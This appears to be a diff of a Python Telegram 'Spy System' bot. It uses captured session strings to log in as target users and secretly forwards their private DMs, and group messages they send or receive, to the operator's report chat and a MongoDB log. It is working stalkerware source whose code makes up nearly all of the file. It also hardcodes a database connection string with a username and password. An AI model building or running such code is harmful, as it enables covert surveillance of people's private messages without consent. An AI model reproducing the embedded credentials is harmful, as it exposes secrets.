@@ -1,10 +1,12 @@
 import os
 import asyncio
+import logging
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from pymongo import MongoClient
 from flask import Flask
-app = Flask(__name__)
+from threading import Thread
+from datetime import datetime
 
 # --- Configurations ---
 API_ID = 38225985
@@ -18,14 +20,23 @@ MONGO_URI = "mongodb+srv://khantphyoemin537_db_user:9VRKiaeZkz7rJdpz@cluster0.w6
 db_client = MongoClient(MONGO_URI)
 db = db_client["SpySystem_DB"]
 sessions_db = db["active_strings"]
+spy_logs = db["spy_logs"] # Delete Sync အတွက် ID တွေသိမ်းရန်
 
-# Main Bot Client (သခင်လေးနဲ့ ဆက်သွယ်ဖို့)
+# Keep Alive Setup
+app = Flask(__name__)
+@app.route("/")
+def home(): return "🦇 Spy System is Online"
+
+def run_flask():
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+
+# Main Bot Client
 bot = TelegramClient("report_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-active_clients = {} # Run နေတဲ့ UserBot တွေကို သိမ်းထားဖို့
+active_clients = {}
 
 # ==========================================
-# 🛰 USERBOT SPY LOGIC (Target ဆီက စာဖတ်ခြင်း)
+# 🛰 USERBOT SPY LOGIC (Filtered Reporting)
 # ==========================================
 async def run_spy_client(session_str):
     try:
@@ -36,20 +47,56 @@ async def run_spy_client(session_str):
         
         @client.on(events.NewMessage)
         async def spy_handler(event):
-            # Report Chat ကိုတော့ ချန်ထားမယ်
             if event.chat_id == REPORT_CHAT: return
             
-            chat = await event.get_chat()
-            chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Unknown'))
+            should_report = False
+            label = ""
+
+            # 1. Private Chat (အဝင်ရော အထွက်ရော အကုန်ယူမယ်)
+            if event.is_private:
+                should_report = True
+                label = "📩 Private DM"
             
-            # Bot ကနေတစ်ဆင့် သခင်လေးဆီ Report ပို့မယ်
-            report_text = (
-                f"🚨 **Spy Report (Target: {me.first_name})**\n"
-                f"📍 **In Chat:** {chat_name} (`{event.chat_id}`)\n"
-                f"👤 **Sender:** {event.sender.first_name if event.sender else 'Unknown'}\n"
-                f"💬 **Message:** {event.raw_text}"
-            )
-            await bot.send_message(REPORT_CHAT, report_text)
+            # 2. Group Chat (Target နဲ့ ပတ်သက်မှ ယူမယ်)
+            elif event.is_group:
+                # Target ကိုယ်တိုင် ပို့တာလား?
+                if event.sender_id == uid:
+                    should_report = True
+                    label = "📤 Target Sent"
+                # Target ကို Mention ခေါ်တာလား?
+                elif event.mentioned:
+                    should_report = True
+                    label = "🔔 Mentioned Target"
+                # Target ကို Reply ပြန်တာလား?
+                elif event.is_reply:
+                    reply_msg = await event.get_reply_message()
+                    if reply_msg and reply_msg.sender_id == uid:
+                        should_report = True
+                        label = "💬 Replied to Target"
+
+            if should_report:
+                chat = await event.get_chat()
+                chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Unknown'))
+                sender = await event.get_sender()
+                sender_name = getattr(sender, 'first_name', 'Unknown')
+
+                report_text = (
+                    f"🕵️ **Spy Alert [{label}]**\n"
+                    f"👤 **Target:** {me.first_name}\n"
+                    f"📍 **Where:** {chat_name} (`{event.chat_id}`)\n"
+                    f"👤 **From:** {sender_name}\n"
+                    f"💬 **Message:** {event.raw_text}"
+                )
+                
+                # Report ပို့ပြီး Message ID ကို DB မှာ မှတ်ထားမယ် (ဖျက်ရင် လိုက်ဖျက်ဖို့)
+                sent_msg = await bot.send_message(REPORT_CHAT, report_text)
+                spy_logs.insert_one({
+                    "report_msg_id": sent_msg.id,
+                    "target_uid": uid,
+                    "chat_id": event.chat_id,
+                    "text": event.raw_text,
+                    "time": datetime.utcnow()
+                })
 
         active_clients[uid] = client
         await client.run_until_disconnected()
@@ -57,10 +104,21 @@ async def run_spy_client(session_str):
         print(f"Error on session {session_str[:10]}: {e}")
 
 # ==========================================
-# ⚙️ STRING MANAGER COMMANDS
+# 🗑 DELETE SYNC LOGIC
 # ==========================================
+@bot.on(events.MessageDeleted)
+async def delete_handler(event):
+    # Report Chat ထဲက စာဖျက်လိုက်တာကို စောင့်ကြည့်မယ်
+    if event.chat_id == REPORT_CHAT:
+        for msg_id in event.deleted_ids:
+            # DB ထဲမှာ အဲ့ဒီ message id ရှိရင် လိုက်ဖျက်မယ်
+            result = spy_logs.delete_one({"report_msg_id": msg_id})
+            if result.deleted_count > 0:
+                print(f"🗑 Log deleted from DB for msg_id: {msg_id}")
 
-# String ကို Reply ပြန်ပြီး သိမ်းမည့် Logic
+# ==========================================
+# ⚙️ COMMANDS & RESTART
+# ==========================================
 @bot.on(events.NewMessage(pattern="/string"))
 async def add_string(event):
     if event.sender_id != OWNER_ID: return
@@ -70,16 +128,13 @@ async def add_string(event):
     reply_msg = await event.get_reply_message()
     session_str = reply_msg.raw_text.strip()
 
-    # DB မှာ သိမ်းမယ်
     if not sessions_db.find_one({"session": session_str}):
         sessions_db.insert_one({"session": session_str})
-        await event.reply("✅ String ကို DB မှာ သိမ်းလိုက်ပါပြီ။ စောင့်ကြည့်မှု စတင်နေပါပြီ...")
-        # စောင့်ကြည့်မှု ချက်ချင်း စတင်မယ်
+        await event.reply("✅ String သိမ်းပြီးပါပြီ။ Smart Monitoring စတင်ပါပြီ...")
         asyncio.create_task(run_spy_client(session_str))
     else:
         await event.reply("⚠️ ဒီ String က ရှိပြီးသားကြီးပါ သခင်လေး။")
 
-# Bot ပွင့်လာတာနဲ့ DB ထဲက String အဟောင်းတွေကို ပြန် Run မယ်
 async def restart_all_spies():
     for data in sessions_db.find():
         asyncio.create_task(run_spy_client(data["session"]))
@@ -88,15 +143,7 @@ async def restart_all_spies():
 # 🚀 START SYSTEM
 # ==========================================
 if __name__ == "__main__":
-    # Render အတွက် Port ကို background မှာ ဖွင့်မယ်
-    from threading import Thread
-    def run_flask():
-        port = int(os.environ.get("PORT", 10000))
-        app.run(host='0.0.0.0', port=port)
-
-    Thread(target=run_flask).start() # Flask ကို သီးသန့် thread နဲ့ run မယ်
-
-    print("🦇 Spy System is Online...")
+    Thread(target=run_flask).start()
+    print("Bat Spy System is Online...")
     bot.loop.create_task(restart_all_spies())
     bot.run_until_disconnected()
-
